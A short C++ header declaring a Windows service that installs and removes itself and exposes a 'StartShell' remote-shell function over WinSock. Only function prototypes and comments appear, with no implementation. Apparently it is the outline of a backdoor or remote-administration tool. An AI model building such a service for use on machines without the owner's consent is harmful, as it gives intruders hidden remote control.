#pragma once
#include <iostream>
#include <WinSock2.h>
#include <winsock.h>
#include <windows.h>
#include <Winsvc.h>
#include <cstdio>
#include <cstring>
#pragma comment(lib, "ws2_32.lib")

using namespace std;

#define SERVICE_OP_ERROR -1
#define SERVICE_ALREADY_RUN -2
/**
* @brief CallBack Function to Translate Service Control Code
* @param dwCode Service Control Code
*/
void WINAPI ServiceControl(DWORD dwCode);

/**
* @brief Start Remote Shell
* @lpParam the Client Handle
*/
DWORD WINAPI StartShell(LPVOID lpParam);

/**
* @brief Service Running Function
* @lpParam NULL
*/
DWORD WINAPI RunService(LPVOID lpParam);

/**
* @brief the Main Function of the Service
*/
void WINAPI ServiceMain2(DWORD dwArgc, LPTSTR *lpArgv);

/**
* @brief Install Service
*/
int APIENTRY InstallService();


/**
* @brief Remove Service
*/
int RemoveService();

void DoTask();
// 显示消息对话框
void ShowMessage(WCHAR *lpszMessage, WCHAR *lpszTitle);